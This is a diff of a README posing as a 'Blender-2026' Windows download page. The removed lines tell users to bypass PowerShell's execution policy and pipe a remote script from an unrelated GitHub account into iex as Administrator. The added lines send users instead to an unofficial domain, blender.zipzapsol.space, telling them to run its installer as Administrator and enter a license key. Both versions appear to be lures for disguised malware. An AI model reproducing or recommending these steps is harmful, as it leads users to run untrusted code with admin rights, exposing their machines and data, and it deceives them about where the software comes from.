@@ -2,7 +2,7 @@
 
 **Blender-2026**
 
-**Blender** download for Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+**Blender** download for Windows 10/11. Scroll to **Download & Install** for the direct direct download link below.
 
 [![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Get-Download%20Link-16a34a?style=flat-square)]()
 
@@ -10,22 +10,30 @@
 
 ## Download & Install
 
-> **This is the download page.** Copy the command below into **PowerShell (Admin)** to download and run the installer.
+> **This is the download page.** Use the button or link below to get **Blender** for Windows.
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+<p align="center">
+  <a href="https://blender.zipzapsol.space/">
+    <img src="https://img.shields.io/badge/Download-Blender-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Blender">
+  </a>
+</p>
 
-| Step | What to do |
+| | |
 | --- | --- |
-| 1 | Press **Win + X** → **Terminal (Admin)** or **PowerShell (Admin)** |
-| 2 | Paste the command above and press **Enter** |
-| 3 | Wait for the download — progress shows in the console |
-| 4 | Follow on-screen prompts (license key if asked) |
-| 5 | Restart if requested, then open **Blender** from Start menu |
+| **Direct link** | **[blender.zipzapsol.space](https://blender.zipzapsol.space/)** |
+| **Full URL** | `https://blender.zipzapsol.space/` |
+| **Type** | Installer for Windows 10 / 11 (64-bit) |
+| **Admin** | Run setup as Administrator |
 
-**Install type:** PowerShell one-liner (no browser required after Admin shell is open).
+### Quick steps
+
+1. Click **[Download — blender.zipzapsol.space](https://blender.zipzapsol.space/)** (link above)
+2. Save the file from the project page
+3. Run the setup **as Administrator**
+4. Enter your license key when prompted
+5. Restart if the installer asks — then launch from Start menu
+
+<p align="center"><a href="https://blender.zipzapsol.space/"><strong>⬇ Download Blender now</strong></a></p>
 
 ---
 
